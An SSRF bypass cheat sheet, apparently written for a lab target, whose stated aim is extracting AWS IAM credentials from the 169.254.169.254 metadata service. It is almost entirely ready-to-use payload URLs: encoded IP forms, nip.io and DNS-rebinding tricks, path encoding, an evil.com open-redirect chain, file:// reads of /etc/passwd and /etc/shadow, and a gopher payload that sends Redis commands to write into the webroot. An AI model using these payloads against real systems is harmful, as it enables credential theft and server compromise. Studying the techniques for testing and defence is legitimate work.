🔓 SSRF Bypass Techniques Cheat Sheet

Reference guide for Server-Side Request Forgery bypass methods

📋 Target Information

Primary Target: AWS IMDS
IP: 169.254.169.254
Critical Endpoint: /latest/meta-data/iam/security-credentials/WebServerRole
Objective: Extract AWS credentials (AccessKeyId, SecretAccessKey, Token)

🎯 IP Format Bypasses

1. Decimal IP Format NONE MEDIUM
http://2852039166/latest/meta-data/iam/security-credentials/WebServerRole
Calculation:
169 × 256³ + 254 × 256² + 169 × 256 + 254 = 2,852,039,166

For localhost (127.0.0.1):
127 × 256³ + 0 × 256² + 0 × 256 + 1 = 2,130,706,433
2. Hexadecimal IP Format NONE MEDIUM
http://0xa9fea9fe/latest/meta-data/iam/security-credentials/WebServerRole
http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/... (dotted notation)
Calculation:
169 = 0xa9
254 = 0xfe
169.254.169.254 = 0xa9fea9fe

For localhost:
127.0.0.1 = 0x7f000001
3. Octal IP Format NONE MEDIUM
http://0251.0376.0251.0376/latest/meta-data/...
Calculation:
169 (decimal) = 251 (octal) = 0251
254 (decimal) = 376 (octal) = 0376

For localhost:
127.0.0.1 = 0177.0000.0000.0001
4. Short Form IP NONE MEDIUM
http://127.1:8080/ (expands to 127.0.0.1)
http://127.0.1:8080/ (missing one octet)
http://0:8080/ (expands to 0.0.0.0)
5. IPv4-Mapped IPv6 NONE MEDIUM
http://[::ffff:169.254.169.254]/latest/meta-data/...
http://[::ffff:127.0.0.1]:8080/

🌐 DNS-Based Bypasses

6. DNS Wildcard Services NONE MEDIUM
http://169.254.169.254.nip.io/latest/meta-data/...
http://127.0.0.1.nip.io:8080/
http://metadata.169.254.169.254.xip.io/...
Note: nip.io and xip.io resolve to the IP in the subdomain
7. DNS Rebinding NONE MEDIUM HIGH
http://rebind.network/attack
Advanced: DNS changes between validation check and actual fetch

📝 Encoding Bypasses

8. URL Encoding (Path) NONE MEDIUM
http://169.254.169.254/%6c%61%74%65%73%74/meta-data/...
"latest" = %6c%61%74%65%73%74
"metadata" = %6d%65%74%61%64%61%74%61
9. Double Encoding NONE
http://169.254.169.254/%256c%2561%2574%2565%2573%2574/...
Double encoded "latest"

🔄 Redirect-Based Bypasses

10. Open Redirect Chain NONE MEDIUM
http://evil.com/redirect.php?url=http://169.254.169.254/...
Requires: External server that redirects
Works if: Application follows redirects

📂 Protocol Bypasses

11. File Protocol NONE MEDIUM
file:///etc/passwd
file:///etc/shadow
file:///var/www/html/ssrf_multilevel.php (source code)
12. Gopher Protocol NONE
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html
Advanced: Can send arbitrary TCP packets to services like Redis
